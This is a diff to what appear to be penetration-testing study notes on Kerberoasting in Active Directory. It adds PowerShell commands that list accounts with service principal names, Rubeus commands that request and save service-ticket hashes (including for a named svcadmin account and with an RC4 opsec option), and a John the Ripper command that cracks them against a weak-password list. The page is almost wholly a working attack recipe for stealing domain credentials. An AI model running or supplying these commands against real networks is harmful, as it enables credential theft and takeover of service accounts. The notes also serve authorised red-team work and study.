@@ -32,7 +32,12 @@ Machine accounts wont work, because they create 100 characters and rotate it eve
 
 {% code overflow="wrap" %}
 ```powershell
+Get-DomainUser -SPN
 Get-NetUser -SPN
+
+.\rubeus.exe kerberoast
+.\rubeus.exe kerberoast /stats
+Rubeus.exe kerberoast /stats /rc4opsec
 
 ADModule:
 Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -properties ServicePrincipalName
@@ -43,6 +48,12 @@ Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -properties ServicePrincip
 
 {% code overflow="wrap" %}
 ```powershell
+.\rubeus.exe kerberoast /user:svcadmin /simple
+.\rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec
+
+Kerberoast all possible accounts:
+.\rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
+
 Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN Name from command before"
 ```
@@ -63,6 +74,8 @@ Invoke-Mimikatz -Command '"kerberos::list /export"'
 
 {% code overflow="wrap" %}
 ```powershell
+john.exe --wordlist=C:\AD\Tools\kerberoast\10kworst-pass.txt C:\AD\Tools\hashes.txt
+
 python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\filenameOfMimikatzExport
 ```
 {% endcode %}
